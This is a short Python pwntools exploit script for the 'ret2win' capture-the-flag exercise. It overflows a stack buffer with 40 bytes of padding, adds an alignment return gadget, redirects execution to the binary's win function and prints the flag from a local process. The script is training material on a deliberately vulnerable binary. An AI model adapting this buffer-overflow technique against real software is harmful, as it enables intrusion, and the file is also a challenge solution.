
import pwn as pwntools

bin = './ret2win'

elf = pwntools.context.binary = pwntools.ELF(bin, checksec=False)
pwntools.context.log_level = 'info'

io = pwntools.process(argv=[], executable=bin)

padding = 40
rogue_ret_ptr=0x0000000000400770

payload = pwntools.flat(
    b'A' * padding,
    rogue_ret_ptr,
    elf.functions.ret2win
)

pwntools.write('py_payload1', payload)

io.sendlineafter(b'> ', payload)

io.recvuntil(b"Well done! Here's your flag:\n")

pwntools.success(io.recvline().decode('utf-8'))
io.close()